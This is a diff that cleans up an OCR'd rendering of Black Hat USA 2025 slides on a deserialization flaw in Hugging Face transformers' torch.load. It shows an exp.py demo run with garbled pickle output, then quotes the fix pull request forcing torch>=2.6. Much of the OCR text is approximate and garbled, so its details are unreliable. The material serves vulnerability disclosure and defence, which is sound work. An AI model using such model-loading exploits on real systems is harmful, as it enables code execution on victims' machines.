@@ -3632,10 +3500,6 @@ pipeline = pipeline( =ltext eration", ="./demo")
 Run i exp (1)
 /root/tmp_python_project/.venv/bin/python /root/tmp_python_project/tran/exp.py
 (.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/tran# cat /tmp/1.txt
-archive/data.pklFBZZZZZZZZZZZZZZ@xtest
-q.Py@8%4archive/versionFBQZZZZZZZ2Z22Z2Z2Z2Z2Z22Z2ZZ2Z2ZZ2Z22Z2Z2ZZZ2ZZZZZZZZZZ2ZZZZZZZZZ3
-PygU?archive/byteorderFB; ZZZZZZZZ2Z2Z22Z2Z2Z2Z22Z2Z22Z2Z22Z2Z222Z222Z2Z2ZZZZ22ZZ2Z2ZZZZZZZZZZZZZZZZZZZ1LittlePe=. archivd
-22Z22Z2ZZZZZZZZZZ1176810298272338838400000013799447126819P630( (y@s8%archive/data.pklygU_archive/versioné¢
 n_idPK, -@PK@PK@(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/tran# 418
 ```
 
@@ -3647,16 +3511,14 @@ n_idPK, -@PK@PK@(.venv) root@iZjécit8a025m7gcofépk4Z:~/tmp_python_project/tran
 
 https://github.com/huggingface/transformers/pull/37785
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Report the Finding
 © 2025-05-07 18:24
-axe ees)
 WRB Yih-Dar Shieh
-ub
 Hi
-'
 Thanks for waiting while we investigated. A fix has been applied in https://github.com/huggingface/transformers/pull/37785. About:
 Force torch>=2.6 with torch.load to avoid vulnerability issue #37785
 SWVCuem Cyrilvallez merged 6 commits into main from fix-vulnerability (on Apr 25
@@ -3665,7 +3527,6 @@ g) Cyrilvallez commented on Apr 25 - edited ~ Member Reviewers
 Cs) vasqu
 What does this PR do? @ Rocketknight!
 As per the title, following the vulnerability report received. torch. load in unsafe even with weights_only=True for any
-é Assignees
 version < 2.6
 No one assigned
 Whenever we do not have weights_only=False explicitly, either from user input or internally, we should raise an Error asking
@@ -3685,7 +3546,8 @@ https://github.com/huggingface/transformers/pull/37785
 
 https://github.com/huggingface/transformers/pull/37785
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Patch
@@ -3699,7 +3561,6 @@ Patch
 522
 523
 524
-Lys
 526
 527
 528
@@ -3711,7 +3572,6 @@ Lys
 534
 535
 536
-ee
 +
 521
 522
@@ -3775,7 +3635,6 @@ return torch. load(
 checkpoint_file,
 map_location=map_location,
 weights_only=weights_only,
-**extra_args,
 src/transformers/utils/import_utils.py oO
 @@ -1387,6 +1387,16 @@ def is_rich_available():
 return _rich_available
@@ -3807,15 +3666,13 @@ https://github.com/huggingface/transformers/pull/37785
 
 122 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Update, Now!
 UPDATE?
-o-
 PLEASE
-ys
-memerarsenaliry
 122
 #BHUSA @BlackHatEvents
 ```
@@ -3856,10 +3713,10 @@ memerarsenaliry
 
 125 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-blackhat
 BRIEFINGS
 AUGUST 6-7, 2025
 MANDALAY BAY / LAS VEGAS
